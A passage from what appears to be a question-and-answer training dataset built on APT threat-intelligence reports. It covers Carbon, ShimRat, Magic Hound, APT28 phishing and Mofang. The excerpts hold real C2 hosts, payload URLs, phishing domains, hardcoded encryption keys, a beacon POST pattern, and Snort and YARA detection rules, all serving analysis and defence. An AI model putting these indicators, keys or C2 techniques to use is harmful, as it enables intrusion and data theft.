plugins\n%randompath%\\Nls\\b9s3coff.ax: files related to the tasks to be executed and the named pipe\n%randompath%\\Nls\\a67ncodc.ax: file related to the tasks to be executed\n%randompath%\\vndkrmn.dic: log file\n%randompath%\\qavsrc.dat: log file\n%randompath%\\miniport.dat: configuration file\n%randompath%\\asmcerts.rs: purpose currently unknown\n%randompath%\\getcert.rs: purpose currently unknown\nThe files are not automatically created during the startup of the malware. The files are created only if the orchestrator needs them.\nMedium Headline: Configuration file\nThe configuration file (miniport.dat) is used by the second and the third stage. The file is encrypted with the (<http://en.wikipedia.org/wiki/CAST-128>)CAST-128 algorithm, the same algorithm that has been used by Uroburos to encrypt the file systems. The encryption key is:\n{ 0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0, 0xfe, 0xfc,  0xba, 0x98, 0x76, 0x54, 0x32, 0x10 } Note: following the logic, 0xfc would be expected to be 0xdc.\nHere is an example of the configuration file:\npaul@gdata:~/Carbon/$ ./decrypt.py miniport.dat\nSmall Headline: [VERSION]\nSystem=3/71\nUser=3/62\nThe websites listed in [CW_INET] and [CW_INET_RESULTS] are all compromised legitimate WordPress websites. By the time of writing this article, all websites have been cleaned and patched.\nThe file format is the same as the .ini file format from Windows. The authors use the Windows API to parse the configuration (GetPrivateProfileStringA()).The file contains:\nA unique ID to identify the infected machine (object_id);\nThe command and control server used by stage 3 (addressX);\nThe version of the \"system\" and the \"user\" library (in [VERSION]);\nThe frequency and time of execution of several internal tasks ([TIME]);\nThe name of the named pipe used as communication channel between the \"system\" and the \"user\" (system_pipe);\nThe process name where stage 3 will be injected (iproc);\n\u2026\nMedium Headline: Features\nThe orchestrator creates nine threads in order to handle the different features. We will now have a look at the most interesting threads.\nOne thread is used to check if the parameters in the configuration file have changed.\nA second thread is used to check the available hard disk space. If the HDD space is low, the orchestrator generates an entry in the log file:\nThe preceding screenshot reveals a rather interesting use of English, again. From what we can conclude, we believe \"Survive me\" is supposed to mean something like \"Rescue me\" in the sense of \"help me to survive\".\nA third thread is created in order to handle the tasks. A task is a command sent from the C&C that is to be executed. The code to be executed is stored locally on the infected machine. The orchestrator is able to execute libraries (by executing the export start()) or to execute Windows' command line. The command line can be execute with the current user privilege or with the privilege of another user (via CreateProcessA() or CreateProcessAsUserA()):\nA fourth thread is used to handle the log rotation file (vndkrmn.dic).\nA fifth thread is used to create and read the data sent to the named pipes.\nA sixth thread is used to load plugins. For the orchestrator a module is a library file with a specific export called ModuleStart(). The plugin list is stored in the configuration file ([PLUGINS]). This thread is very similar to the third thread, but is bares some minor differences. The function to execute the plugins is not the same.\nFinally a seventh thread is used to inject stage 3 (msximl.dll) into the browsers and email clients. The list of the targeted processes is stored in the configuration file: iproc = iexplore.exe,outlook.exe,msimn.exe,firefox.exe,opera.exe,chrome.exe\nAs usual, the injected library is executed via the ModuleStart() exports.\nSmall Headline: [LOG]\nstart=1\n30/12/14|08:28:44|acce6511-ba11-fa11-f0047d1|s|ST|3/71|0|\n30/12/14|08:29:50|acce6511-ba11-fa11-f0047d1|s|INJ|C:\\Program Files\\Windows Mail\\en-\nUS\\msximl.dll|\n30/12/14|08:30:28|acce6511-ba11-fa11-f0047d1|s|INJ|0|2204|\n30/12/14|08:30:28|acce6511-ba11-fa11-f0047d1|u|ST|3/62|\"C:\\Program Files\\Internet\nExplorer\\iexplore.exe\" :2204|\n30/12/14|08:30:28|acce6511-ba11-fa11-f0047d1|u|ST|2204:END|\n30/12/14|08:30:39|acce6511-ba11-fa11-f0047d1|u|W|-1|0|ALL|NOINET|\n30/12/14|08:30:41|acce6511-ba11-fa11-f0047d1|u|W|-1|0|ALL|NOINET|\n30/12/14|08:37:18|acce6511-ba11-fa11-f0047d1|s|STOP|3/71|0|\n30/12/14|08:37:18|acce6511-ba11-fa11-f0047d1|s|STOP|OK|\n30/12/14|08:39:45|acce6511-ba11-fa11-f0047d1|s|ST|3/71|0|\n30/12/14|08:41:13|acce6511-ba11-fa11-f0047d1|s|INJ|C:\\Program Files\\Windows Mail\\en-US\\msximl.dll|\n30/12/14|08:41:34|acce6511-ba11-fa11-f0047d1|s|INJ|0|2196|\n30/12/14|08:41:34|acce6511-ba11-fa11-f0047d1|u|ST|3/62|\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" :2196|\n30/12/14|08:41:34|acce6511-ba11-fa11-f0047d1|u|ST|2196:END|\n30/12/14|08:41:35|acce6511-ba11-fa11-f0047d1|u|OPER|Wrong config: no lastconnect|\n30/12/14|08:41:36|acce6511-ba11-fa11-f0047d1|u|P|0|NULL|0|Sleep:41|\n30/12/14|08:41:38|acce6511-ba11-fa11-f0047d1|u|OPER|Wrong config: no lastconnect|\n30/12/14|08:41:39|acce6511-ba11-fa11-f0047d1|u|W|-1|0|tazohor.com:/|nrt|\n30/12/14|08:41:40|acce6511-ba11-fa11-f0047d1|u|W|-1|0|61paris.fr:/|nrt|\n30/12/14|08:41:40|acce6511-ba11-fa11-f0047d1|u|W|0|NULL|0|Sleep:1816467|\n30/12/14|08:41:40|acce6511-ba11-fa11-f0047d1|u|P|0|NULL|0|Sleep:604\nThe log format is:Date|Time|Unique ID|source|message\nThe source can be:\nS: stands for the orchestrator (or \"System\");\nU: stands for the injected library (or \"User\").\nThe format of the message is not always the same. However, the first part is the executed feature:\nST: start (either for the orchestrator or the injected library); the second part of the message is the version (for example 3.71 for the orchestrator and 3.62 for the injected library) and, regarding the injected library, the name of the host process;\nSTOP: stop;\nOPER: message for the operator (for example when the disk space is low);\nW: web requests;\nINJ: injection; the second part of the message is the path of the file (lib) used to be injected into e.g. the browser or the PID;\nL: load library log message;\nS: log rotation message;\nT: message linked to the task execution;\nMedium Headline: Communication to the command & controls\nThe communication to the operators is performed via the URL stored in the configuration file.\nFirstly, the malware performs a GET request in order to identify whether the C&C is up and running.\nIf the first query is a success, a second request is sent to the C&C with the difference that some data is included into an (<http://en.wikipedia.org/wiki/HTTP_cookie>)HTTP Cookie. The content of the cookie is catid, task, id, forumid, itemid, link, layout, start, limit (none of the parameters is mandatory). The data sent in this cookie is encrypted, using the CAST-128 algorithm, and encoded.\nThe malware can also generate POST requests. Here is an example of the pattern:POST hxxp://%s/%s? uid=%d&context=%s&mode=text&data=%s\nThe malware uses the (<https://blog.gdatasoftware.com/http://>)same technique as Tavdig does to receive orders. The data can be seen between the <div> and the </div> field in the following screenshot:\n\nHow does the first stage of Project Cobra operate to load the second stage, and what encryption algorithm is used to protect the configuration file?",
    "output": "The first stage of Project Cobra is designed to load the second stage by checking all files in the %SystemRoot%\\\\inf\\\\ directory to find the entry with a unique ID, which determines the path for the second stage. Once found, it loads the second stage library and executes the exported function ModuleStart(). The configuration file (miniport.dat) used by the second and third stages is encrypted with the CAST-128 algorithm, the same algorithm used by Uroburos to encrypt file systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 7.2.3 Command and control communication\nShimRatReporter communicates over HTTP with a preconfigured C2 server. The generated report is first compressed using lz compression applied with the RtlCompressBuffer Windows api function. After compression, the data is encrypted with a combination of shifting and xor using a static key. The key hardcoded in all versions seen in the wild is 'NetMeter'.\nAfter a report is generated, the raw buffer with the data is taken and iterated through using an index. If the index is divisible by two, the value in the buffer is xor-ed. If it's not divisible by two, the value of the key is added to the value in the buffer. This is probably best explained by showing the code for the decryption tool that fox-it has created:\nFor every element in the encrypted report data, the index is checked to be divisible by two, using the modulo operation to wrap the key. If this is true, the value in the encrypted report is xor-ed with a value from the static key. If it is not divisible, it will subtract the ordinal key value from the current element in the encrypted report. In the encryption process the subtraction is just an addition.\nThe report is then sent out in a post request to a preconfigured C2 server and a gate path. The url parameter filename is added to the post url. Its value is the computer name, also listed in the report, and an id. The C2 servers responds with a 200 ok when the report has been successfully received.\nAdditionally, ShimRatReporter can be configured to download a payload. Reporting is default but payload downloading is optional. Payloads are downloaded from preconfigured locations. The payloads are encrypted in a similar way. Figure 15 shows an example payload download from the same campaign as shown in Figure 14.\nMedium Headline: 8.1 Snort signatures\nThe following Snort signatures provide coverage for the known HTTP based ShimRat and ShimRatReporter C2 communication protocols. One thing to keep in mind is that some variants of ShimRat communicate over HTTPS, which these rules will not cover.\nThese IOCs are also available from our Github repository located at:\nalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"FOX-SRT - Trojan - ShimRat check-in (Data)\"; flow:established,to_server; content:\"POST\"; http_method; content:\". php HTTP/1.\"; content:\"|0d0a0d0a|Data$$\"; fast_pattern:only; content:!\"Content-Type\"; content:!\"Referer:\"; content:!\"Cookie:\"; content:\"|0d0a0d0a|\"; pcre:\"/Data\\$\\$\\d\\d/R\"; content:\"Data\"; isdataat:!1,relative; threshold: type limit, track by_src, count 1, seconds 600; classtype:trojan-activity; reference:url,blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/; sid:21001854; rev:4;)\nalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"FOX-SRT - Trojan - ShimRat check-in (php)\"; flow:established,to_server; content:\"POST\"; http_method; content:\".php HTTP/1.\"; content:\"|0d0a0d0a|php\"; fast_pattern:only; content:!\"Content-Type\"; content:!\"Referer:\"; content:!\"Cookie:\"; threshold: type limit, track by_src, count 1, seconds 600; classtype:trojan-activity; reference:url,blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/; sid:21001855; rev:4;)\nalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"FOX-SRT - Trojan - ShimRat check-in (Yuok)\"; flow:established,to_server; content:\"POST\"; http_method; content:\".php HTTP/1.1|0d0a|User-Agent:  \"; fast_pattern:only; content:!\"Content-Type\"; content:!\"Referer:\"; content:!\"Cookie:\"; content:\"|0d0a0d0a|\"; pcre:\"/(php)?Yuok\\$\\$\\d\\d/R\"; content:\"Yuok\"; isdataat:!1,relative; threshold: type limit, track by_src, count 1, seconds 600; classtype:trojan-activity; reference:url,blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/; sid:21001856; rev:4;)\nalert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"FOX-SRT - Trojan - ShimRatReporter check-in\"; content:\"POST\"; http_method; content:\"Accept-Encoding: utf-8|0d0a|\"; fast_pattern; uricontent:\".php?filename=\"; content:\"Accept: */*\"; content:!\"Referer\"; content:!\"Content-Type\"; threshold: type limit, track by_src, count 1, seconds 600; classtype:trojan-activity; reference:url,blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/; sid:21001857; rev:4;)\nMedium Headline: 8.2 Domains & IP addresses\nThe following domains and associated ips have a lot of historical data. Keep in mind the listed domains could be on shared hosting machines or compromised websites. Please make sure to correlate any hits from the table below with the listed samples and their configurations in section 10.1.\nThis table only contains domains setup by the Mofang group themselves, it does not contain some of the compromised shared hosting domains listed in some samples in paragraphs 9.2 and 9.3.\nMedium Headline: 9.1 yara rules\nThe following yara rules can be used to detect the ShimRat and ShimRatReporter samples.\nThese IOCs are also available from our Github repository located at:\nShimRat\nShimRatReporter\nrule shimratreporter\n{\nmeta:\ndescription = \"Detects ShimRatReporter\"  author = \"Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)\"  date = \"20/11/2015\"\nstrings:\n$IpInfo = \"IP-INFO\"\n$NetworkInfo = \"Network-INFO\"\n$OsInfo = \"OS-INFO\"\n$ProcessInfo = \"Process-INFO\"\n$BrowserInfo = \"Browser-INFO\"\n$QueryUserInfo = \"QueryUser-INFO\"\n$UsersInfo = \"Users-INFO\"\n$SoftwareInfo = \"Software-INFO\"\n$AddressFormat = \"%02X-%02X-%02X-%02X-%02X-%02X\"\n$proxy_str = \"(from environment) = %s\"\n$netuserfun = \"NetUserEnum\"\n$networkparams = \"GetNetworkParams\"\ncondition:\nall of them\n}\nQuestion: How does ShimRatReporter, used by the Mofang group, compress and encrypt its reports before sending them to the C2 server? Explain the process in detail.",
    "output": "Answer: ShimRatReporter compresses the generated report using lz compression applied with the RtlCompressBuffer Windows API function. After compression, the data is encrypted using a combination of shifting and XOR with a static key. The key hardcoded in all versions seen in the wild is 'NetMeter'. The encryption process involves iterating through the raw buffer with the data using an index. If the index is divisible by two, the value in the buffer is XOR-ed with the corresponding value from the static key. If it's not divisible by two, the value of the key is added to the value in the buffer. This process is reversed during decryption, where if the index is divisible by two, the value in the encrypted report is XOR-ed with a value from the static key, and if it is not divisible, it will subtract the ordinal key value from the current element in the encrypted report.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: PUPY LOADER\nPupy comes with default loaders that run the RAT on a variety of different platforms, specifically Windows, OSX, Linux and We have seen the Magic Hound actors using both the 32-bit and 64-bit DLL loaders that come with Pupy to infect Windows systems. We have gathered three samples of the default loader associated with this group and extracted the following\nconfigurations:\nThese configurations show that this group uses both fully-qualified domain names and IP addresses to host their Pupy C2 servers. Also, the configurations show the use of the \"obfs3\" (The Threebfuscator) transport, which is an obfuscation method to hide the true TCP-based communications protocol. The \"obfs3\" is used in the Tor project and the specifics of this transport can be found at (<https://gitweb.torproject.org/pluggable-transports/obfsproxy.git/tree/doc/obfs3/obfs3-protocol-spec.txt>)the Tor Project.\nBig Headline: MAGICHOUND.DROPIT\nThe Magic Hound campaign was also discovered using a custom dropper tool, which we have named MagicHound.DropIt.\nThe DropIt Trojan we analyzed is an executable that builds an embedded executable by decoding embedded blobs of base64 encoded data and concatenating them together in the correct order. In all of the DropIt samples we collected, the dropper will then save the executable to the user's %TEMP% folder and execute the file, specifically to one of the following filenames:\n%TEMP%\\spp.exe\n%TEMP%\\sloo.exe\n%TEMP%\\spoo.exe\n%TEMP%\\vschos.exe\nWe have also seen Magic Hound using DropIt like a binder Trojan, specifically dropping a legitimate decoy executable along with the malicious executable as a payload. For example, we analyzed a DropIt sample (SHA256: cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671) that dropped two executables, one of which was saved to \"%TEMP%\\flash_update.exe\" that was a legitimate Flash Player installer. We believe the Magic Hound campaign uses the DropIt Trojan to run legitimate applications that fit their social engineering, which in the example above included coercing the victim into updating their Flash Player.\nBig Headline: MAGICHOUND.RETRIEVER\nWe observed a DropIt sample installing another Trojan we call MagicHound.Retriever. At a high level, Retriever is a .NET downloader that downloads secondary payloads from servers associated with Magic Hound. While the Trojan itself does not resemble the other Magic Hound tools, it does create a folder named \"c:\\temp\" that the Magic Hound loader creates to store its persistence executable, as previously discussed. The folder name is quite generic and by itself is not a great correlation point, however, this coupled with the shared infrastructure makes a higher fidelity connection between the two.\nThe Retriever Trojan uses the following namespace:\nusing pcchekapp.grp.ammar.samaneh;\nAndroid.The malware begins by creating a web service object and uses the following URL within its configuration:\nhttp:// service.chrome-up[.]date:8080 /WebService.asmx\nIt then calls a function called \"SetLog2\", which sets variables for the system's IP address, MAC address and hostname. A password variable is available but unused in this sample. The code will gather some information about the system, specifically the local IP address, MAC address, and the external IP address of the system. The code obtains the external IP address via an HTTP request using to \"http://checkip.dyndns.org/\" and uses a regular expression to locate an IP address from the HTTP response.\nOnce these variables are set, the malware uses the SoapHttpClientProtocol class to communicate with its C2 server, which issues an HTTP POST requests that appears as:\nAs you can see from the above request, the SoapHttpClientProtocol class neatly structures data into an HTTP POST request. All subsequent interaction with the C2 server uses the same SOAP web service, so we will not show all of the generated HTTP requests. Instead, we will refer to the specific SOAP action (see \"SOAPAction\" field in previous example, specifically \"SetLog2\") that the Trojan requests from the C2 server and the response from the C2 server. After sending the C2 the system information, the malware then issues a second request for \"GetHasAnything\", which will communicate with the C2 server and ask the server if it has a secondary binary for the Trojan to install.\nIf the C2 server provides any response to the \"GetHasAnything\" request, it then calls the \"GetIdAbOne\" SOAP method to obtain what we believe is a unique identifier for the system that the Trojan will use for further interaction with the C2. After receiving this variable, the Trojan calls the \"GetNameAbById\" to obtain a base64 string that will be the filename written in a newly created \"c:\\temp\" (decoded from \"YzpcdGVtcFw=\") folder. The Trojan will then call \"GetAbById\", which the C2 will provide a base64 string for the contents for the file to write to c:\\temp. After obtaining the unique ID from the C2 server, the Trojan calls the \"SetAbStatById\" method to notify the C2 server of its status of \"1\" to notify the server it had successfully received the filename and file data.\nWith the file written to the system, the Trojan calls the \"GetishideAbById\" SOAP action to determine whether or not the C2 server wishes to execute the newly dropped file in a hidden window. This request is followed by a call to \"GetisrunasAbById\" to determine if the Trojan should use \"runas\" to execute the downloaded executable with elevated privileges, which would display the UAC dialog for the user to click.\nUnfortunately, we were unable to obtain a secondary payload from an active C2 server.\n\nQ: Describe the functionality and purpose of the MagicHound.DropIt Trojan. How does it operate, and what strategies does it use to deceive victims?",
    "output": "A: The MagicHound.DropIt Trojan is a custom dropper tool used by the Magic Hound campaign. It operates by building an embedded executable from base64 encoded data blobs and saving it to the user's %TEMP% folder under various filenames such as spp.exe, sloo.exe, spoo.exe, or vschos.exe. Additionally, MagicHound.DropIt can act as a binder Trojan, dropping both a legitimate decoy executable and a malicious payload. For instance, it might drop a legitimate Flash Player installer alongside the malicious executable to coerce the victim into running it, thereby enhancing the effectiveness of their social engineering tactics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What role did Damballa play in identifying and analyzing the Aurora botnet, and how did their methods contribute to understanding the attack?",
    "output": "Damballa focused on detecting Command and Control (CnC) tethering and the malicious communications between victims' computers and remote criminal operators. They used key DNS observations about the operational characteristics of Dynamic DNS zones to identify different states of the botnet's operation. Damballa also reviewed historical DNS resolution data to determine when and how frequently the CnC domain names associated with the Aurora botnet were queried. This provided valuable insights into the pace at which victims joined the botnet and established a timeline for the Aurora attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: A Bit More Abuse\nThe phishing URLs in this campaign were encoded with a distinct set of parameters using base64. When clicked, the links provided key information about the targets to the phishing website. An identical approach to parameters and encoding (see Figure 28 below) has been seen before: in the March 2016 phishing campaign that targeted Hillary Clinton's presidential campaign and the Democratic National Committee. This similarity suggests possible code reuse: the two operations may be using the same phishing 'kit'.\nThe that targeted the DNC also included the same Google security-themed phishing ruse, and abused another URL shortening service, In June 2016 Dell SecureWorks published a attributing the operation to APT28, a threat actor\nthe Russian government.\nSecureWorks researchers were able to enumerate and analyze the targets of this campaign, thus allowing them to describe the victimology:\n\"individuals in Russia and the former Soviet states, current and former military and government personnel in the U.S. and Europe, individuals working in the defense and government supply chain, and authors and journalists \u2014 but also included email accounts linked to the November 2016 United States presidential election\"\nThis victimology strikes an immediate parallel to the target listing we have uncovered in our enumeration of the Tiny.cc URLs.\nMedium Headline: Domain Schema Commonalities\nWe found similarities in domain naming, and subdomain structures, between this campaign and operations linked to APT28.\nThe domain used in the campaign targeting Satter was id833[.]ga. At the time of the campaign, this domain name was pointed to a server at IP address 89.40.181[.]119. Using PassiveTotal, we observed other domain names sharing a similar naming scheme also directed at this IP: id834[.]ga, and id9954[.]gq. While we did not observe any phishing links for these alternate domains, there were identical subdomains registered for both:\nThis domain / subdomain naming schema is also extremely close to one featured in Mandiant's 2017 report, in a phishing operation, linked to APT28, which targeted OAuth tokens in an effort to obtain persistent access to a victim's Google account, and to\nbypass the security of two-factor authentication.\nDomain linked to this campaign:\n-\nmyaccount.google.com-changepasswordsecuritypagesettingmyaccountgooglepagelogin.id833[.]ga\n-\nDomain mentioned by Mandiant, linked to APT28:myaccount.google.com\nchangepassword-securitypagesettingmyaccountgooglepage.id4242[.]ga\nThe similarities in naming and subdomain structure are immediately apparent. The two domains (id833[.]ga and id4242[.]ga) also share a common name server. However, we were not able to find specific registration overlaps between the domains or servers.\nFurthermore, during the campaign period, the domain identified by Mandiant, id4242[.]ga resolved to 89.32.40[.]238. This IP also resolves to a range of other suspicious domains with highly similar naming schemas to those connected to the infrastructure used against Satter. The link used to phish John Podesta, as depicted above, also shares distinct naming and subdomain similarities with domains linked to the phishing operation against Satter (see Figure 28):\nDomain targeting Podesta, linked to APT28: hxxp://myaccount.google.com-securitysettingpage[.]tk\nDuring the campaign in March 2016, this domain was hosted at IP address80.255.12[.]237\nPublications from numerous private industry groups attribute 89.32.40[.]238 and 80.255.12[.]237 (as well as related domains) to APT28. While we are able to point out that there are significant commonalities in domain naming and subdomain structure between the campaign targeting Satter and domains linked to these IPs, we are not able to make a more conclusive technical link to APT28.\nWhile industry groups as well as the U.S. government have APT28 with Russian state actors, we are not able to use infrastructure analysis alone to conclusively connect the operation against Satter to a particular state sponsor. Connecting this infrastructure to a specific government would require additional evidence which is not, to our knowledge, available in the public domain.\nMedium Headline: The Challenge of Attribution\nWhile the order of events surrounding the phishing, credential theft, and eventual leak of tainted documents belonging to David Satter would seem to point to CyberBerkut, the characteristics of Russian information operations make the task of attribution to a state sponsor challenging. As a consequence, there is no \"smoking gun\" connecting the evidence we have assembled to a particular Russian government agency, despite the overlaps between our evidence and that presented by numerous industry and government reports concerning Russian-affiliated threat actors.\nAddressing the topic of attribution requires nuance and appreciation of the unique character of\nRussia's approach to the use of in the criminal underworld in particular is informed by a very elaborate strategy around information operations and control. Although this strategy has roots that go back deep into Soviet (and even earlier Russian) history, it was more fully elaborated as a component of hybrid warfare, also known as the or \",\" and infused with deeper resources after the 'color revolutions,' the 2011 Moscow protests, and upon reflection of the events of the Arab Spring. The overall Russian approach as a form of \"guerrilla geopolitics\" in which \"a would-be great power, aware that its ambitions outstrip its military resources, seeks to leverage the methodologies of an insurgent to maximise its capabilities.\" Cultivating organized criminal groups is a fundamental component of this approach, as evidenced in the annexation of Crimea which was undertaken in coordination with criminal elements who provided \"political (<http://www.ecfr.eu/page/-/ECFR_169_-_PUTINS_HYDRA_INSIDE_THE_RUSSIAN_INTELLIGENCE_SERVICES_1513.pdf>)and military muscle.\" Russian security officers are also of underworld criminal operations for illicit revenue of their own, and as a result can even prioritize criminal over national security concerns.\nWhile it is possible that a proxy actor is implementing the front-end collection component of the phishing campaign we are describing, the scale of the targeting also suggests a well-resourced actor, such as a nation state. The thread linking all of the targets is their connection to issues that the Russian government cares about. The targets are people whose positions or activities give them access to, or influence over, sensitive information of specific interest to Russia. This links an otherwise extremely diverse target set, which ranges from domestic Kremlin critics and journalists, to anti-corruption investigators, foreign government personnel, and businesspeople.\nThe data collected from such a campaign would come in more than a dozen languages, and concern a diverse range of political, military, and policy issues from at least 39 countries and 28 governments. In addition, such a campaign would be likely to generate large volumes of\ndata. For this reason, a professionalized, well-resourced operator would be needed for any effective post-collection analysis of the stolen data. Even greater resources would be required to analyse, and in some instances carefully modify in a short timeframe, the contents of stolen email and cloud-storage accounts for the purposes of seeding disinformation via tainted leaks.\nThe diversity and presumed cost of analyzing the stolen data along with the clear Russian nexus for the targets is only circumstantial evidence of a Russian connection. It should be evaluated in the context of the other pieces of circumstantial evidence we present, including the overlaps in tactics with known Russia-linked actors, and the prominent role of CyberBerkut.\n\nQ: In what ways does the phishing campaign targeting David Satter resemble the March 2016 campaign that targeted Hillary Clinton's presidential campaign and the Democratic National Committee? What does this similarity suggest about the potential relationship between these campaigns?",
    "output": "A: The phishing campaign targeting David Satter resembles the March 2016 campaign that targeted Hillary Clinton's presidential campaign and the Democratic National Committee in several ways. First, the phishing URLs in both campaigns were encoded with a distinct set of parameters using base64. Second, both campaigns used a Google security-themed phishing ruse. Third, both campaigns abused URL shortening services. These similarities suggest possible code reuse, indicating that the two operations may be using the same phishing 'kit'. Additionally, the victimology of both campaigns is strikingly similar, with targets including individuals in Russia and the former Soviet states, current and former military and government personnel in the U.S. and Europe, individuals working in the defense and government supply chain, authors and journalists, and email accounts linked to the November 2016 United States presidential election.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Win32/Ogimant. A threat that claims to help download items from the Internet, but actually downloads and runs files that are specified by a remote attacker.\nHTML/Pangimop. A detection for the Magnitude exploit kit, also known as Popads. It attempts to exploit vulnerabilities in programs such as Java and Adobe Flash Player to install other malware.\nWin32/Pdfjsc. A family of specially crafted PDF files that exploit Adobe Acrobat and Adobe Reader vulnerabilities. Such files contain malicious JavaScript that executes when the file is opened.\nWin32/Peaac. A generic detection for various threats that display trojan characteristics.\nWin32/Peals. A generic detection for various threats that display trojan characteristics.\nJS/Proslikefan. A worm that spreads through removable drives, network shares, and P2P programs. It can lower the computer's security settings and disable antivirus products.\nWin32/Radonskra. A family of threats that perform a variety of malicious acts, including stealing information about the computer, showing extra advertisements as the user browses the web, performing click fraud, and downloading other programs without consent.\nWin32/Ramnit. A family of multi-component malware that infects executable files, Microsoft Office files, and HTML files. Win32/Ramnit spreads to removable drives and steals sensitive information such as saved FTP credentials and browser cookies. It may also open a backdoor to await instructions from a remote attacker.\nWin32/Reveton. A ransomware family that targets users from certain countries or regions. It locks the computer and displays a location-specific webpage that covers the desktop and demands that the user pay a fine for the supposed possession of illicit material.\nWin32/Sality. A family of polymorphic file infectors that target executable files with the extensions .scr or .exe. They may execute a damaging payload that deletes files with certain extensions and terminates security-related processes and services.\nWin32/SaverExtension. A browser add-on that shows ads in the browser without revealing their source, and prevents itself from being removed normally.\nWin32/Sdbby. A threat that exploits a bypass to gain administrative privileges on a machine without going through a User Access Control prompt.\nWin32/Simda. A threat that can give an attacker backdoor access and control of an infected computer. It can then steal passwords and gather information about the computer to send to the attacker.\nPHP/SimpleShell. A backdoor that can give an attacker the ability to run shell commands on a compromised server.\nWin32/Skeeyah. A generic detection for various threats that display trojan characteristics.\nWin32/Slugin. A file infector that infects .exe and .dll files. It may also perform backdoor actions.\nWin32/Stuxnet. A multi-component family that spreads via removable volumes by exploiting the vulnerability addressed by Microsoft Security Bulletin MS10-046.\nWin32/Tugspay. A downloader that spreads by posing as an installer for legitimate software, such as a Java update, or through other malware. When installed, it downloads unwanted software to the computer.\nWin32/Upatre. A downloader that installs malware and unwanted software on the affected computer without the user's consent. It is frequently distributed as an attachment to spam email messages.\nWin32/Vercuser. A worm that typically spreads via drive-by download. It also receives commands from a remote server, and has been observed dropping other malware on the infected computer.\nWin32/Wordinvop. A detection for a specially-crafted Microsoft Word file that attempts to exploit the vulnerability CVE-2006-6456, addressed by Microsoft Security Bulletin MS07-014.\nWin32/Wordjmp. An exploit that targets a vulnerability in Word 2002 and 2003 that could allow an attacker to remotely execute arbitrary code. Microsoft released Security Bulletin MS06-027 in June 2006 to address the vulnerability.\n\nBased on the above text, answer a question. How does Win32/Ogimant operate to compromise a system, and what specific actions does it perform once it has successfully infiltrated?",
    "output": "Win32/Ogimant operates by claiming to assist in downloading items from the Internet, thereby deceiving users into running it. Once executed, it downloads and runs files specified by a remote attacker. This allows the attacker to gain control over the infected system and potentially execute further malicious activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What insights can be drawn from the fact that the Grabit malware did not employ sophisticated evasion techniques in its dynamic activity, despite the complexity of its core development?",
    "output": "The fact that the Grabit malware did not employ sophisticated evasion techniques in its dynamic activity, despite the complexity of its core development, suggests a disconnect between the technical sophistication of the malware's creation and its operational deployment. This could indicate that different members of the threat actor group have varying levels of technical expertise and security awareness. Some members may be highly skilled in developing complex malware, while others responsible for deployment may not prioritize stealth and evasion. This insight highlights the importance of understanding the organizational structure and capabilities of threat actor groups to better defend against their attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: 5.2 Earlier campaigns in Myanmar\nMyanmar has been the target of Mofang's attacks for years before the campaign related to the sez. Throughout the years, the Mofang group has compromised countless servers belonging to government or other Myanmar related organizations, in order to stage attacks. A few notable ones are described below.\nThe earliest activity from Mofang in Myanmar dates back to around May 2012 when they attacked a government entity. Interestingly they abused a Myanmar government server they had compromised earlier, to function as the C2 server. It was the website of the Ministry of Commerce located at commerce.gov.mm. The C2 gate was located at /templates/css1/logon.php.\nAnother compromised server from the Myanmar government used to stage a ShimRat payload that was seen around early June 2015. The payload for this campaign was located at 203.81.162.178/text.txt. The ip address noted here hosted the official government website of the Myanmar port authorities at the time. The C2 server for this campaign was dns.undpus.com.\nIn late September 2015 Mofang used the website of Myanmar's national airline hosted at www.flymna.com for an attack against an organization in Myanmar. The payload was located at www.flymna.com/sites/photo.tar and contained ShimRatReporter. After executing it would send its report to a C2 server at dns.undpus.com but also download a payload from a preconfigured location. This location was: dns.undpus.com/myanmar.jpg.\n\nQuestion: How did Mofang leverage compromised servers in Myanmar to stage their attacks, and what specific tactics did they employ in some of their notable campaigns?\n\nAnswer:",
    "output": "Mofang leveraged compromised servers belonging to government or other Myanmar-related organizations to stage their attacks. For instance, in May 2012, they abused a Myanmar government server they had previously compromised, using it as a Command and Control (C2) server. Specifically, they used the website of the Ministry of Commerce located at commerce.gov.mm, with the C2 gate located at /templates/css1/logon.php. In another campaign around early June 2015, they staged a ShimRat payload on a compromised server hosting the official government website of the Myanmar port authorities at 203.81.162.178. The payload was located at 203.81.162.178/text.txt, and the C2 server for this campaign was dns.undpus.com. Additionally, in late September 2015, Mofang used the website of Myanmar's national airline hosted at www.flymna.com for an attack against an organization in Myanmar. The payload, containing ShimRatReporter, was located at www.flymna.com/sites/photo.tar. Upon execution, it would send its report to a C2 server at dns.undpus.com and also download a payload from a preconfigured location at dns.undpus.com/myanmar.jpg.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
